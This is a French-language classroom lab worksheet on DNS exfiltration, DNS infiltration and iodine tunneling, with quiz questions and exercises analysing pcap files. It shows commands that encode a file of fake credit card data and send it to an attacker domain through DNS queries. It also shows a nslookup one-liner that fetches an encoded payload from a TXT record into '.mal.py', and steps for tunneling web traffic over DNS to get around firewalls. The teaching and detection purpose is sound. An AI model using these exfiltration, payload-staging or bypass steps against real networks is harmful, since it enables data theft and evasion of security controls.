## Manipulation de DNS

Le formulaire de réponse se trouve à l'emplacement suivant : 

                         https://forms.gle/htrWWf6yGhGvpS7z9
                         
                         
Lors de ce TP nous explorerons les techniques utilisées pour exfiltrer et infiltrer les données à travers des serveurs DNS.<br/>

**A quoi servent les serveurs DNS ?** 

Le DNS est un système de noms de domaine faisant référence à un système de nommage qui résout les noms de domaine avec des adresses IP.  
Les serveurs DNS sont répartis dans le monde entier et sont constamment mis à jour et synchronisés entre eux de manière systématique.

<p align="center">
  <img src="https://blog.nameshield.com/fr/wp-content/uploads/sites/3/2017/04/r%C3%A9solution-dns-2-5.jpg"/>
</p>

L'objet de ce TP sera d'explorer les techniques pour exfiltrer et infiltrer les données ainsi que le Tunneling de DNS Tunneling et comment il peut être utilisé pour bypasser différents protocoles comme HTTP via DNS.

<p align="center">
  <img src="https://cdn.discordapp.com/attachments/798799811482353734/798809211060355092/intro-2-1.png"/>
</p>

##### Installation de l'environnement de travail pour le TP :

```console
$ git clone https://github.com/kleosdc/dns-exfil-infil

$ sudo apt-get update
$ sudo apt-get install python3-pip
$ export PATH=/usr/local/bin:$PATH

$ sudo pip3 install base58
$ sudo pip3 install pyshark
```

### IODINE

Iodine permet de tunneler les données IPv4 via un serveur DNS. Cela peut être utile dans différentes situations où l'accès Internet est protégé par un pare-feu, mais les requêtes DNS sont autorisées.



Installer iodine :
```console
$ sudo apt-get install iodine
```

### Wireshark

Wireshark est un analyseur de paquets libre et gratuit. 

Installer Wireshark :
```console
$ sudo apt-get install tshark
```

---

### Lexique 

**Qu’est-ce qu'un enregistrement AAAA ?**  
Un record DNS AAAA (record d'adresse) traduit un nom de domaine vers une adresse IPv6, à l'instar du record DNS A qui pointe un nom de domaine vers une adresse IPv4.

Vous pouvez par example créer un record AAAA pour le hostname "www" qui réfère vers l'adresse IPv6 2a00:1140:0200:0000::17, ainsi www.votredomaine.com pointera vers le serveur à l'adresse IPv6 2a00:1140:0200:0000::17.

le nom AAAA pour les enregistrements d'adresses IPv6 fait référence à une adresse IPv6 (128 bits) faisant quatre fois la taille d'une adresse "A" de type IPv4 (32 bits).

**Qu’est-ce qu'un Reverse DNS ?**

- Le terme Reverse DNS (rDNS), ou Reverse DNS Lookup, désigne une requête DNS permettant de retourner le nom de domaine et le nom d’hôte d’une adresse IP.   
- La seule condition, c’est que l’adresse Internet à retourner dispose d’un PTR-Record (enregistrement « Pointer »), qui pointe le nom et permet ainsi une requête dite « inversée » dans le Domain Name System.   
- L’organisation de ces entrées, que l’on retrouve dans l’espace de nom du site (domaine), est de la responsabilité des différents fournisseurs Internet. Les modifications de l’enregistrement Pointer sont donc exclusivement possibles avec l’accord du fournisseur.

**Pointer Records**

- Le DNS met en corrélation les noms de domaine avec les adresses IP. Un enregistrement de pointeur DNS (PTR en abrégé) fournit le nom de domaine associé à une adresse IP. 
- Un enregistrement DNS PTR est exactement le contraire de l'enregistrement « A », qui fournit l'adresse IP associée à un nom de domaine.

- Les enregistrements DNS PTR sont utilisés dans les recherches DNS inversées.  
- Lorsqu'un utilisateur tente d'atteindre un nom de domaine dans son navigateur, une recherche DNS se produit, faisant correspondre le nom de domaine à l'adresse IP. 
- Une recherche DNS inversée est l'inverse de ce processus : il s'agit d'une requête qui commence par l'adresse IP et recherche le nom de domaine.

---

#### Questions :

Sous Windows, quelle commande utiliser avec nslookup pour requêter un enregistrement txt pour YouTube.com ?
```console
Réponse : 
```

Sous Linux, quelle commande utiliser avec dig pour requêter un enregistrement txt pour Facebook.com ?
```console
Réponse : 
```

Quel type d'adresses IP stocke le AAAA avec le nom de hôte ?
```console
Réponse : 
```

Le nombre maximum de caractères pour un enrigrement DNS est de 256. Vrai/Faux ?
```console
Réponse : 
```

Quel enregistrement DNS donne le nom du domaine en reverse-lookup ?
```console
Réponse : 
```

Quel serait le résultat d'un reverse-lookup pour l'adresse IPv4 suivante : 192.168.203.2 ?
```console
Réponse : 
```

Quelle est la taille maximale d'un nom DNS ? (en incluant les points!)
```console
Réponse : 
```

---

### Exfiltration DNS : Theorie

L'exfiltration DNS est une technique qui consiste à utiliser le DNS pour dérober des données.<br/>
Cette technique est principalement utilisée comme moyen de collecter des informations personnelles telles que les numéros de sécurité sociale, la propriété intellectuelle ou d'autres informations personnellement identifiables.  

- L'exfiltration DNS est une cyberattaque sur les serveurs via le DNS, qui peut être effectuée manuellement ou automatiquement en fonction de l'emplacement physique de l'attaquant et de la proximité des appareils cibles.   
- Dans un scénario manuel, les attaquants obtiennent souvent un accès physique non autorisé à l'appareil ciblé pour extraire des données de l'environnement.
- Alors que dans l'exfiltration DNS automatisée, les attaquants utilisent des logiciels malveillants pour effectuer l'exfiltration des données à l'intérieur du réseau compromis.

- Le service DNS est généralement disponible sur une machine cible et autorisant le trafic sortant généralement sur le port TCP ou UDP 53. Cela fait de DNS un candidat de choix pour les pirates informatiques à utiliser pour exfiltrer des données.

- L'exfiltration de données via DNS pourrait permettre à un attaquant de transférer un grand volume de données depuis l'environnement cible. De plus, l'exfiltration DNS est principalement utilisée comme moyen de collecter des informations personnelles telles que les numéros de sécurité sociale, la propriété intellectuelle ou d'autres informations personnellement identifiables.

- L'exfiltration DNS est principalement utilisée en ajoutant des chaînes contenant le « butin » souhaité aux requêtes DNS UDP. La chaîne contenant le butin serait alors envoyée à un serveur DNS malveillant qui enregistre ces requêtes. Pour un œil non averti, cela pourrait ressembler à un trafic DNS normal ou ces demandes pourraient être perdues dans le mélange de nombreuses demandes DNS légitimes.

<p align="center">
  <img src="https://cdn.discordapp.com/attachments/798799811482353734/807298488881643550/exfil.png"/>
</p>

### Exfiltration DNS : Exemple

- Dans cet exemple de scénario, un attaquant essaie d'exfiltrer des données vers son système et a décidé que sa meilleure option serait d'utiliser des requêtes DNS. 
- L'objectif de l'attaquant est d'exfiltrer des informations sensibles d'une machine sur le réseau de SecureCorp. Dans cette démo, je montrerai les étapes qu'un attaquant pourrait suivre pour exfiltrer ces données de la machine compromise.

<img src="https://cdn.discordapp.com/attachments/798799811482353734/807298488881643550/exfil.png"/>

les informations de carte de crédit ont été générés via un faux générateur de cartes de crédit. 
Toutes les informations de carte de crédit sont fausses :)

Les fichiers utilisés pour cette démo se trouvent dans le repo `dns-exfil-infil` sur GitHub. 
Vous aurez besoin de fichiers pour compléter le reste du TP.

[securecorp.txt](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/securecorp.txt)  
[packety.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packety.py)  
[packetGrabber.py](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packetyGrabber.py)  

1. Fichier texte contenant de faux numéros de carte de crédit, noms, adresses.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129675221958696/1.PNG"/>


2. packety.py ( https://github.com/kleosdc/dns-exfil-infil )

Lorsque packety.py est exécuté, vous devrez fournir au script l'entrée suivante :

* Nom de fichier : (C'est le fichier (Text file RECOMMENDED) que vous essayez d'exfiltrer du réseau de SecureCorp)

* Nom de domaine : ( c'est ici que vous allez mettre votre nom de domaine, par exemple badbaddoma.in )

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129727180472340/2.1.PNG"/>


`python packety.py
`
`Filename: securecorp.txt
`
`Domain Name (Example: badbaddoma.in): badbaddoma.in
`
`[+] Reading file.
`
`[+] Base64 encoded.
`
`[+] Base58 encoded.
`
`Start transmitting... [PRESS ENTER KEY]
`

- Le code commence par la lecture du fichier texte.   
- Le contenu du fichier texte sera d'abord encodé en Base64 puis en Base58. Cela nous laisse avec une longue chaîne encodée.  
- La chaîne est ensuite divisée en sections de 20 caractères où chaque section aura 3 caractères 'factices' ajoutés pour plus d'obscurcissement.   
- Un caractère sera ajouté au début de la chaîne encodée et deux caractères seront ajoutés.

- Par exemple, une section des données encodées pourrait ressembler à ceci : « 6gfghhjywsas3rg4hda3 ». Une fois les caractères supplémentaires ajoutés, il deviendra "x6gfghhjywsas3rg4hda3yu".

- Une fois que tout est encodé et prêt, le code attendra que l'utilisateur appuie sur "ENTREE" afin de commencer à transmettre les requêtes au serveur DNS.  
- Le serveur DNS aurait déjà été configuré pour capturer les requêtes entrantes avec 'Wireshark' ou 'tshark'.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129732692967474/3.PNG"/>

- Ensuite, il ne reste plus qu'à attendre que la transmission atteigne 100%. Si l'une des requêtes n'est pas livrée à temps et dans le bon ordre, les données exfiltrées seront incomplètes et inutiles pour l'attaquant.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129738539565066/5.PNG"/>

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129741236502568/6.PNG"/>

3. `packetyGrabber.py` ( https://github.com/kleosdc/dns-exfil-infil )

Le code demandera à l'utilisateur la saisie suivante :

* Fichier capturé : Il s'agit du fichier .pcap que vous avez capturé sur votre serveur DNS.

* Sortie du nom de fichier : il s'agit du nom du fichier dans lequel les données décodées seront enregistrées.

* Nom de domaine : Ce sera votre nom de domaine.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129744641622016/7.PNG"/>

`python3 ~/tools/packety/packetyGrabber.py
`
`File captured: cap-credit-cards.pcap
`
`Filename output: credit-cards.txt
`
`Domain Name (Example: badbaddoma.in): badbaddoma.in
`
`[+] Domain Name set to badbaddoma.in
`
`[+] Filtering for your domain name.
`
`[+] Base 58 decoded.
`
`[+] Base 64 decoded.
`
`[+] Output to credit-cards.txt
`
- Si tout se passe bien, qu'aucune requête n'a été perdue et que toutes les entrées sont correctes, un fichier avec les données décodées sera enregistré dans le même répertoire à partir duquel vous avez exécuté le code.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129748282933258/8.PNG"/>

### Exfiltration DNS : Pratique

**Se connecter à la machine cible en SSH**

Utiliser les crédentiels suivants :
* Utilsateur : user
* Mot de passe : P@ssword01

Parcourir les fichiers dans les dossiers :
```console
~/challenges/exfiltration
~/dns-exfil-infil/
```

Aller dans le dossier ci-dessous et lire les instructions dans le fichier TASK :
```console
$ cd ~/challenges/exfiltration/orderlist
```

L'extension de fichier .pcap  est principalement associée avec Wireshark
les fichiers .pcap créés pas Woreshark contiennent les données en paquets d'un réseau. 

Ces fichiers sont utilisés principalement dans l'analyse des caractéristiques du réseau d'un certain données. Ils contribuent également à contrôler avec succès le trafic d'un certain réseau depuis qu'ils sont surveillés par le programme.

- Analyser le fichier order.pcap et détecter le fichier comportant des requêtes suspectes :
```console
Réponse : $ tshark ...
```

Le script `~/dns-exfil-infil/packetyGrabber.py` permet de decrypter les fichiers Wireshark.
```console
$ python3 ~/dns-exfil-infil/packetyGrabber.py
```

Ignorer l'exception levée à la fin du script.

Quel est le nom de la première transaction ? 
```console
Réponse : 
```

Quel est la valeur de la transaction Firewall ?
```console
Réponse : 
```

Aller dans le dossier ci-dessous :
```console
$ cd ~/challenges/exfiltration/identify/
```
Parmi les fichiers `*.pcap` analyser leur contenu :
```console
Réponse : $ tshark ...
```
Si vous peinez à réaliser la commande demander au formateur de vous la fournir



Quel fichier contient des requêtes DNS douteuses ? Pourquoi ?
```console
Réponse : 
```

```console
python3 ~/dns-exfil-infil/packetyGrabber.py
```

Trouver le texte récupéré après avoir décodé les données en utilisant le programe Pyhton packetyGrabber.py qui se trouve dans le dossier `~/dns-exfil-infil/`.
```console
Réponse : 
```

---

### Infiltration DNS : Theorie

- L'infiltration DNS est une autre méthode utilisée par les attaquants pour exploiter les diverses vulnérabilités du système de noms de domaine d'une organisation. 

- Contrairement aux attaques d'exfiltration sur le DNS, l'infiltration définit le processus par lequel le code malveillant est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés où les attaquants se connectent à distance à l'infrastructure réseau, soit manuellement.

- L'infiltration DNS est principalement utilisée pour les efforts de suppression de fichiers ou de mise en scène de logiciels malveillants. 

- Avec des systèmes de détection des menaces basés sur le comportement, les signatures ou la réputation, il est possible que cette méthode d'attaque soit détectée.

- Cependant, si cette méthode de transport des données passe inaperçue, elle peut conduire à des activités malveillantes telles que l'exécution de code dans l'environnement de l'organisation. 

- Historiquement, cela a causé des ravages et des perturbations pour diverses entreprises bien connues.

- En résumé, le protocole DNS pourrait être utilisé comme un protocole secret qui pourrait faciliter les efforts de mise en scène et d'exécution des logiciels malveillants pour communiquer avec le ou les serveurs C2 (commande et contrôle) d'un attaquant. 

- Dans la tâche suivante, nous explorerons comment cela pourrait être réalisé.

### Infiltration DNS : Exemple

introduction

- Dans ce scénario, l'attaquant va infiltrer un morceau de code « malveillant » sur l'ordinateur de la victime. 
- Il existe de nombreuses techniques différentes que les attaquants dans le monde réel utilisent pour y parvenir. 
- Pour simplifier les choses, j'utiliserai un enregistrement TXT configuré sur mon serveur DNS AWS public. La valeur contenue dans cet enregistrement est un code 'malveillant' codé.

- Étant donné que les enregistrements TXT sont limités à 255 caractères, les pirates informatiques auront probablement plusieurs enregistrements TXT configurés pour leur serveur DNS. Cela dépend finalement de la longueur de leur code. 
- Maintenant que tout est configuré et prêt ; tout ce que le pirate informatique doit faire est de demander ces enregistrements TXT, de capturer la ou les valeurs, de les décoder et, les voilà maintenant infiltré leur propre code dans un système compromis via les enregistrements DNS TXT.

<img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>

Vous pouvez voir mon enregistrement TXT ci-dessous.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807138166867623956/1.PNG"/>


Fichiers utilisés pour cette démo

1. `nslookup`

Cela recherchera d'abord l'enregistrement TXT pour rt1.badbaddoma.in, puis obtiendra la valeur entre guillemets, et enfin, il enregistrera la valeur dans un fichier nommé '.mal.py'.

`nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py
`

2. `packetSimple.py` ( https://github.com/kleosdc/dns-exfil-infil )

Lorsque le code vous demande un 'Nom de fichier', entrez le nom de fichier '.mal.py'. C'est le fichier dans lequel nous avons enregistré la valeur encodée.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/807140371967508500/2.PNG"/>


`python3 ~/packetySimple.py
`
`Filename: .mal.py
`
`[+] Reading from file...
`
`[+] Base58 decoded.
`
`[+] Base64 decoded.
`
`[+] Done, .mal.py is decoded.
`
### Infiltration DNS : Pratique

- Lisez le fichier TASK qui se trouve dans le dossier `~/challenges/infiltration/`.

- Vous pouvez utiliser la même commande que celle utilisée dans la partie Infiltration DNS - Exemple.
- Gardez à l'esprit que vous devrez ajuster la section « grep » et utiliser les caractères appropriés pour faire correspondre. Par exemple, si la valeur de texte de l'enregistrement TXT commence par « G6... », vous devrez utiliser « grep G6 ».

**Répondre aux questions ci-dessous**

Suivez les instructions du fichier TASK pour répondre à cette question.

Quelle est la sortie du fichier python exécuté
```
reponse
```

---

### Tunneling : Theorie

- Dans les deux tâches précédentes, nous avons vu comment les requêtes et les réponses DNS pouvaient être utilisées pour infiltrer et exécuter des charges utiles. 

- Les entreprises auront généralement mis en place des pare-feu, des IDS (Intrusion Detection Systems) et/ou des IPS (Intrusion Protection Systems) afin de prévenir/alerter lorsque des protocoles entrants et sortants indésirables transitent par leur réseau. 

- Le protocole DNS est rarement surveillé par les entreprises. Pour cette raison, les pirates peuvent contourner un grand nombre de protocoles « indésirables » en utilisant le tunneling DNS.

### Tunneling : Exemple

Pour cet Exemple, nous allons explorer comment un pirate peut contourner divers sites Web restreints en utilisant HTTP sur DNS. Pour y parvenir, j'utiliserai « iodine ». Vous pouvez en savoir plus sur 'Iodine' ici : [Iodin](https://code.kryo.se/iodine/).

<img src="https://cdn.discordapp.com/attachments/798799811482353734/808200889432145950/tunnel.png"/>

La configuration est la suivante :

Une machine Linux hébergée par AWS qui sera le serveur de tunnel DNS.
Ubuntu VM s'exécutant sur un ordinateur local qui sera le client du tunnel DNS.
Nom de domaine public hébergé sur Google Domains (badbadtunnel.in)
Voici à quoi ressemble la configuration DNS :

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808025216428539954/0.PNG"/>

- Pour commencer, les deux machines doivent avoir iodine installé.  
- Si vous utilisez une distribution basée sur Debian telle que Kali, ce sera dans leurs référentiels apt.

`sudo apt installer iodine
`
`iodine - Client
`
`iodined - Server
`

Sur le serveur AWS, nous commençons le iodined avec les arguments suivants :

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808024404113358868/4.PNG"/>

`Port - 27001
`
`IP du serveur de tunnel DNS - 10.0.0.1
`
`Nom de sous-domaine - tunnel.badbadtunnel.in
`

Maintenant, sur notre machine cliente, exécutez iode avec les arguments suivants :

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808026984356773928/5.PNG"/>

`IP du serveur de tunnel DNS
`
`Nom de sous-domaine`

- Si tout est configuré correctement, nous devrions maintenant avoir une connexion avec notre serveur de tunnel DNS. Nous pouvons essayer de pinger 10.0.0.1 (DNS Tunnel Server) pour voir si nous sommes connectés.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808027486234738728/9.PNG"/>

Nous avons réussi !

- Maintenant, nous avons fait à peu près la moitié du chemin. Notre HTTP sur DNS n'est pas encore complètement configuré.

- Tout d'abord, nous devons générer une clé SSH et télécharger le contenu de id_rsa.pub sur notre serveur DNS Tunnel dans le fichier allowed_keys. 
- Voici les étapes :

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808028494582775818/1.PNG"/>

Voici le contenu de id_rsa.pub

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808028636041052200/2.PNG"/>

- Ici, vous pouvez voir qu'on a ajouté le contenu id_rsa.pub aux clés_autorisées sur mon serveur DNS. Cela me permettra de SSH dans mon serveur.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808028824989728788/3.PNG"/>

- Nous pouvons maintenant nous connecter en SSH à notre serveur de tunnel DNS avec l'option -D 8080

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808029032129888276/6.PNG"/>

- On y est presqee, il nous suffit maintenant d'ouvrir notre navigateur (Firefox dans ce cas) et de modifier les paramètres du proxy. 
- Il existe également des extensions de navigateur telles que FoxyProxy ou Proxy SwitchyOmega.

- Pour les options de proxy, nous devons sélectionner « Configuration manuelle du proxy ».

- Définissez l'hôte SOCKS avec l'adresse IP '127.0.0.1' et pour le numéro de port sur '8080'.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808030366111629322/7.PNG"/>

Et voilà, c'est Terminé!

Nous utilisons maintenant HTTP sur DNS... 
Si nous allons sur myip.is, nous devrions voir l'adresse IP publique de notre serveur de tunnel DNS.

<img src="https://cdn.discordapp.com/attachments/807129623846584321/808030929665785866/8.PNG"/>
